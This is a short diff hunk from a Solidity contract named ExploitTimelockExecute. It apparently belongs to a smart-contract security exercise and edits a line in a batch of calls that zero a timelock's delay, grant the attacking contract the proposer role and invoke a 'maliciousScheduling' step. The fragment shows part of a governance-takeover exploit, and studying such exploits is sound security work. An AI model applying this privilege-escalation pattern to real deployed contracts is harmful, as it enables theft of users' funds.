@@ -175,7 +175,7 @@ contract ExploitTimelockExecute {
         dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
         dataElements[2] = abi.encodeCall(
             AccessControl.grantRole,
-            (keccak256("PROPOSER_ROLE"), address(this))
+            (PROPOSER_ROLE, address(this))
         );
         dataElements[3] = abi.encodeCall(this.maliciousScheduling, ());
         // maliciousScheduling(targets, values, dataElements, salt);
